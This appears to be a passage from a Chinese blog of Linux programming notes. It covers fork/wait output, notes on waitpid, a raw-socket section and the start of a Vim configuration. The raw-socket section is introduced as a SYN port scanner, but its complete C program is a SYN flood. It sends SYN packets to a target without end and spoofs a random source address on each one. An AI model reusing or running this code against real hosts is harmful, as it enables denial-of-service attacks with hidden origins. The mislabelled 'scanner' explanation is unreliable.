<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ./chj</span><br><span class="line">----子进程1----进程标识符是14091</span><br><span class="line">----子进程2----进程标识符是14092</span><br><span class="line">总用量 62160</span><br><span class="line">drwxr-xr-x 11 root     4096 4月   2 20:35 sqlmap</span><br><span class="line">-rw-r--r--  1 root      959 5月   2 15:50 process_sum.c</span><br><span class="line">-rwxr-xr-x  1 root    16928 5月   2 15:50 process_sum</span><br><span class="line">-rw-r--r--  1 root     1058 5月   2 16:12 jinchen.c</span><br><span class="line">-rwxr-xr-x  1 root    16920 5月   2 16:12 jinchen</span><br><span class="line">-rw-r--r--  1 root 63455210 4月   2 20:49 google-chrome-stable_current_amd64.deb</span><br><span class="line">-rw-r--r--  1 root     1507 5月   2 16:38 chj.c</span><br><span class="line">-rwxr-xr-x  1 root    16920 5月   2 16:38 chj</span><br><span class="line">总用量 62160</span><br><span class="line">drwxr-xr-x  9 root     4096 4月  25 10:49 antSword</span><br><span class="line">drwxr-xr-x  5 root    36864 5月   2 15:31 桌面</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 音乐</span><br><span class="line">drwxr-xr-x  3 root     4096 4月  25 11:01 下载</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 文档</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 图片</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 视频</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 模板</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 公共</span><br><span class="line">-rw-r--r--  1 root      985 5月   2 16:00 12.c</span><br><span class="line">-rw-r--r--  1 root      971 5月   2 16:12 123.c</span><br><span class="line">-rwxr-xr-x  1 root    16920 5月   2 16:12 123</span><br><span class="line">drwxr-xr-x 11 root     4096 4月   2 20:35 sqlmap</span><br><span class="line">-rwxr-xr-x  1 root    16912 5月   2 16:00 12</span><br><span class="line">-rw-r--r--  1 root      959 5月   2 15:50 process_sum.c</span><br><span class="line">-rwxr-xr-x  1 root    16928 5月   2 15:50 process_sum</span><br><span class="line">-rw-r--r--  1 root     1058 5月   2 16:12 jinchen.c</span><br><span class="line">-rwxr-xr-x  1 root    16920 5月   2 16:12 jinchen</span><br><span class="line">-rw-r--r--  1 root 63455210 4月   2 20:49 google-chrome-stable_current_amd64.deb</span><br><span class="line">-rw-r--r--  1 root     1507 5月   2 16:38 chj.c</span><br><span class="line">-rwxr-xr-x  1 root    16920 5月   2 16:38 chj</span><br><span class="line">drwxr-xr-x  9 root     4096 4月  25 10:49 antSword</span><br><span class="line">drwxr-xr-x  5 root    36864 5月   2 15:31 桌面</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 音乐</span><br><span class="line">drwxr-xr-x  3 root     4096 4月  25 11:01 下载</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 文档</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 图片</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 视频</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 模板</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 公共</span><br><span class="line">-rw-r--r--  1 root      985 5月   2 16:00 12.c</span><br><span class="line">-rw-r--r--  1 root      971 5月   2 16:12 123.c</span><br><span class="line">-rwxr-xr-x  1 root    16920 5月   2 16:12 123</span><br><span class="line">-rwxr-xr-x  1 root    16912 5月   2 16:00 12</span><br><span class="line">I'm parent, The child process 14092 exit normally</span><br><span class="line">return value:0</span><br><span class="line">父进程,进程标识符是14090</span><br><span class="line">完成！</span><br></pre></td></tr></table></figure>



<p>创建进程使用fork()函数，<strong>执行进程使用exec函数族</strong>，<strong>终止进程则使用exit()和_exit()函数</strong></p>
<p>总结了wait的5个知识点：</p>
<p>&lt;1&gt;.僵尸进程：在一个进程调用了exit之后，该进程并非马上消失还留下一些参与的信息</p>
<p>&lt;2&gt;.用wait结束僵尸进程.</p>
<p>#include &lt;sys/types.h&gt;</p>
<p>#include &lt;sys/wait.h&gt;</p>
<p>pid_t wait (int *stutas)</p>
<p>原理：进程一旦调用了wait，就立即阻塞自己，当分析到当前进程的子进程已经exit，便会收集这个子进程的信息，然后彻底销毁，如果没有找到这样的子进程，就会一直阻塞在这里，直到有一个出现。</p>
<p>&lt;3&gt;.参数status</p>
<p>在wait中，这是一个指向一个整型数据的指针，用来存放子进程退出时的状态，后来又定义了一个WIFEXITED（status)的宏来完成这项工作，这里的status就是一个指针指向的整数。</p>
<p>&lt;4&gt;进程同步。wait可以解决进程的同步问题，通过wait（&amp;status）语句在父进程中等待子进程的返回值。</p>
<p>&lt;5&gt;waitpid函数。其实，wait是waitpid的包装后的形式。waitpid有三个参数（pid，*status，options）</p>
<p>pid&gt;0,只等待PID=pid的子进程；=0,等待同一进程组中的任何子进程；=-1，等待任何子进程退出，此时=wait；&lt;-1，等待指定进程组中的任何子进程</p>
<p>options：WNOHANG|WUNTRACED，也可设为0，此时=wait。</p>
<p>返回值：1.正常返回子进程的PID；2.若设置了WNOHANG，可能返回0；3.error，返回-1。</p>
<hr>
<h2 id="原始套接字编程"><a href="#原始套接字编程" class="headerlink" title="原始套接字编程"></a><strong>原始套接字编程</strong></h2><p><strong>问题: 如何实现SYN扫描器扫描端口 , 比如AB两个设备要进行连接 , A通过端口发一个SYN包给B,B在收到后返回一个ACK包确认连接 , 但是在不确定B端口号时</strong></p>
<p><strong>该如何进行连接 , 答: A给B的每一个端都发一个SYN包, 如果哪个有返回说明端口是开放的, TCP和UDP都无法发实现这样的连接方式 , 所以要使用原始套接字</strong></p>
<p><strong>1、创建一个原始套接字，并设置IP头选项</strong></p>
<p>SOCKET sock;<br>sock = socket(AF_INET,SOCK_RAW,IPPROTO_IP); </p>
<p><strong>这里，我们设置了SOCK_RAW标志，表示我们声明的是一个原始套接字类型。创建原始套接字后，IP头就会包含在接收的数据中，如果我们设定 IP_HDRINCL 选项，那么，就需要自己来构造IP头。注意，如果设置IP_HDRINCL 选项，那么必须具有  administrator权限，</strong></p>
<p><strong>有两种原始套接字：</strong><br>                  <strong>一种是处理IP层及其上的数据，通过指定socket第一个参数为AF_INET来创建这种套接字。</strong><br>                  <strong>另一种是处理数据链路层及其上的数据，通过指定socket第一个参数为PF_PACKET来创建这种套接字</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>SOCK_STREAM</strong></td>
<td><strong>面向连接的流式套接字</strong></td>
</tr>
<tr>
<td><strong>SOCK_DGRAM</strong></td>
<td><strong>面向无连接的数据包套接字</strong></td>
</tr>
<tr>
<td><strong>SOCK_RAW</strong></td>
<td><strong>接收底层数据报文的原始套接字</strong></td>
</tr>
</tbody></table>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOCALPORT 10329</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_tcp</span><span class="params">(<span class="keyword">int</span> sockfd,struct sockaddr_in *addr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> short <span class="title">check_sum</span><span class="params">(<span class="keyword">unsigned</span> short *addr,<span class="keyword">int</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sockfd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">    <span class="keyword">int</span> on=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> destport=<span class="number">80</span>;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nUsage:%s hostIP port\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    bzero(&amp;addr,<span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">    addr.sin_family=AF_INET;</span><br><span class="line">    <span class="keyword">if</span>(argc==<span class="number">3</span>)&#123;</span><br><span class="line">        destport=atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    addr.sin_port=htons(destport);</span><br><span class="line">    <span class="keyword">if</span>(inet_aton(argv[<span class="number">1</span>],&amp;addr.sin_addr)==<span class="number">0</span>)&#123;</span><br><span class="line">        host=gethostbyname(argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span>(host==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"HostName Error:%s\n\a"</span>,hstrerror(h_errno));</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        addr.sin_addr=*(struct in_addr *)(host-&gt;h_addr_list[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span>(sockfd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Socket Error:%s\n\a"</span>,strerror(errno));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&amp;on,<span class="keyword">sizeof</span>(on));</span><br><span class="line">    setuid(getpid());</span><br><span class="line">    send_tcp(sockfd,&amp;addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_tcp</span><span class="params">(<span class="keyword">int</span> sockfd,struct sockaddr_in *addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">100</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">ip</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">tcp</span>;</span></span><br><span class="line">    <span class="keyword">int</span> head_len;</span><br><span class="line"></span><br><span class="line">    head_len=<span class="keyword">sizeof</span>(struct ip)+<span class="keyword">sizeof</span>(struct tcphdr);</span><br><span class="line">    bzero(<span class="built_in">buffer</span>,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    ip=(struct ip *)<span class="built_in">buffer</span>;</span><br><span class="line">    ip-&gt;ip_v=IPVERSION;</span><br><span class="line">    ip-&gt;ip_hl=<span class="keyword">sizeof</span>(struct ip)&gt;&gt;<span class="number">2</span>;</span><br><span class="line">    ip-&gt;ip_tos=<span class="number">0</span>;</span><br><span class="line">    ip-&gt;ip_len=htons(head_len);</span><br><span class="line">    ip-&gt;ip_id=<span class="number">0</span>;</span><br><span class="line">    ip-&gt;ip_off=<span class="number">0</span>;</span><br><span class="line">    ip-&gt;ip_ttl=MAXTTL;</span><br><span class="line">    ip-&gt;ip_p=IPPROTO_TCP;</span><br><span class="line">    ip-&gt;ip_sum=<span class="number">0</span>;</span><br><span class="line">    ip-&gt;ip_dst=addr-&gt;sin_addr;</span><br><span class="line"></span><br><span class="line">    tcp=(struct tcphdr *)(<span class="built_in">buffer</span> + <span class="keyword">sizeof</span>(struct ip));</span><br><span class="line">    tcp-&gt;dest=addr-&gt;sin_port;</span><br><span class="line">    tcp-&gt;doff=<span class="number">5</span>;</span><br><span class="line">    tcp-&gt;syn=<span class="number">1</span>;</span><br><span class="line">    tcp-&gt;ack_seq=<span class="number">0</span>;</span><br><span class="line">    tcp-&gt;check=<span class="number">0</span>;</span><br><span class="line">    tcp-&gt;seq=<span class="built_in">random</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        ip-&gt;ip_src.s_addr=<span class="built_in">random</span>();</span><br><span class="line">        tcp-&gt;source=<span class="built_in">random</span>();<span class="comment">//htons(LOCALPORT);//</span></span><br><span class="line">        <span class="keyword">if</span>(count%<span class="number">10000</span>==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">"Send %d packets\n"</span>,count);</span><br><span class="line">        count++;</span><br><span class="line">        tcp-&gt;check=check_sum((<span class="keyword">unsigned</span> short *)tcp,<span class="keyword">sizeof</span>(struct tcphdr));</span><br><span class="line">        sendto(sockfd,<span class="built_in">buffer</span>,head_len,<span class="number">0</span>,addr,<span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> short <span class="title">check_sum</span><span class="params">(<span class="keyword">unsigned</span> short *addr,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">int</span> nleft=len;</span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">register</span> short *w=addr;</span><br><span class="line">    short answer=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(nleft&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        sum+=*w++;</span><br><span class="line">        nleft-=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(nleft==<span class="number">1</span>)&#123;</span><br><span class="line">        *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(&amp;answer)=*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)w;</span><br><span class="line">        sum+=answer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sum=(sum&gt;&gt;<span class="number">16</span>)+(sum&amp;<span class="number">0xffff</span>);</span><br><span class="line">    sum+=(sum&gt;&gt;<span class="number">16</span>);</span><br><span class="line">    answer=~sum;</span><br><span class="line">    <span class="keyword">return</span>(answer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="Vim编辑器开发环境设置"><a href="#Vim编辑器开发环境设置" class="headerlink" title="Vim编辑器开发环境设置"></a><strong>Vim编辑器开发环境设置</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面<span class="comment"># cat ~/.vimrc </span></span><br><span class="line"><span class="string">" Vundle Setting</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">set nocompatible</span></span><br><span class="line"><span class="string">filetype off</span></span><br><span class="line"><span class="string">set rtp+=~/.vim/bundle/Vundle.vim</span></span><br><span class="line"><span class="string">call vundle#begin()</span></span><br><span class="line"><span class="string">Plugin 'VundleVim/Vundle.vim'</span></span><br><span class="line"><span class="string">"</span><span class="comment"># Plugin 'git://github.com/scrooloose/nerdtree.git'</span></span><br><span class="line"><span class="string">"# Plugin 'git://github.com/kien/ctrlp.vim.git'</span></span><br><span class="line"><span class="string">Plugin 'scrooloose/nerdtree'</span></span><br><span class="line"><span class="string">"</span> Let Vundle manage itself</span><br><span class="line"><span class="string">" Plugins</span></span><br><span class="line"><span class="string"> Plugin 'Valloric/YouCompleteMe'</span></span><br><span class="line"><span class="string"> Plugin 'scrooloose/syntastic'</span></span><br><span class="line"><span class="string"> Plugin 'bling/vim-airline'</span></span><br><span class="line"><span class="string"> Plugin 'SirVer/ultisnips'</span></span><br><span class="line"><span class="string"> Plugin 'edsono/vim-matchit'</span></span><br><span class="line"><span class="string"> Plugin 'elzr/vim-json'</span></span><br><span class="line"><span class="string"> Plugin 'honza/vim-snippets'</span></span><br><span class="line"><span class="string"> Plugin 'justinmk/vim-sneak'</span></span><br><span class="line"><span class="string"> Plugin 'kien/ctrlp.vim'</span></span><br><span class="line"><span class="string"> Plugin 'ludovicchabant/vim-lawrencium'</span></span><br><span class="line"><span class="string"> Plugin 'majutsushi/tagbar'</span></span><br><span class="line"><span class="string"> Plugin 'mhinz/vim-signify'</span></span><br><span 